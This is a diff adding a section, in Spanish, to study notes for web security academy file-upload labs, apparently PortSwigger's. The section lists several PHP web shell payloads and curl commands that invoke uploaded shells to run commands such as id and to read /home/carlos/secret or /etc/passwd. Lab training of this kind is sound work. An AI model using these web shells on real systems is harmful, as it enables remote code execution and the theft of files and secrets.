@@ -23,6 +23,39 @@
 
 ---
 
+## 🐚 Web shells: cómo invocarlos (leer `/home/carlos/secret`)
+
+> [!tip] Lo que casi siempre pide el lab
+> Una vez el shell está **subido y servido** (normalmente en `/files/avatars/`),
+> lo ejecutás pidiéndolo por GET. El objetivo suele ser **leer `/home/carlos/secret`**
+> y pegarlo en *Submit solution*.
+
+| Archivo (en esta carpeta) | Payload | Cómo se llama (URL) |
+| ------------------------- | ------- | ------------------- |
+| [[example_best.php]] | `<?php system($_GET['command']); ?>` | `…/files/avatars/example_best.php?command=cat%20/home/carlos/secret` |
+| [[example.php]] | `<?php echo system($_GET['command']); ?>` | igual, `?command=…` (⚠ duplica la última línea) |
+| [[file-upload-vulnerabilities/exploit.php\|exploit.php]] | `<?php echo file_get_contents('/home/carlos/secret'); ?>` | `…/files/avatars/exploit.php` **(sin parámetro, ya lee el secreto)** |
+| [[polyglot-web-shell-rce/build_polyglot.py]] → `exploit.php` | `<?php echo system($_GET["cmd"]); ?>` | `…/files/avatars/exploit.php?cmd=cat%20/home/carlos/secret` (ojo: param **`cmd`**) |
+
+```bash
+# Shell de comandos (system): el comando que interesa es leer el secreto
+curl 'https://LAB-ID.web-security-academy.net/files/avatars/example_best.php?command=cat%20/home/carlos/secret'
+curl 'https://LAB-ID.web-security-academy.net/files/avatars/example_best.php?command=id'      # comprobar RCE
+
+# Lector directo (file_get_contents): no lleva parámetro
+curl 'https://LAB-ID.web-security-academy.net/files/avatars/exploit.php'
+
+# Polyglot generado por build_polyglot.py -> parámetro cmd
+curl 'https://LAB-ID.web-security-academy.net/files/avatars/exploit.php?cmd=cat%20/home/carlos/secret'
+```
+
+> [!note] Elegir shell
+> - **`?command=`** (system) → RCE genérico, corrés cualquier comando (`id`, `ls`, `cat …`).
+> - **`file_get_contents`** → cuando solo querés el secreto y no un shell.
+> - El espacio en la URL va como `%20`. Para otro fichero: `?command=cat%20/etc/passwd`.
+
+---
+
 ## Metodología: de lo simple a lo rebuscado
 
 > Probar en este orden. En cuanto uno pase el filtro **y** se ejecute → RCE.
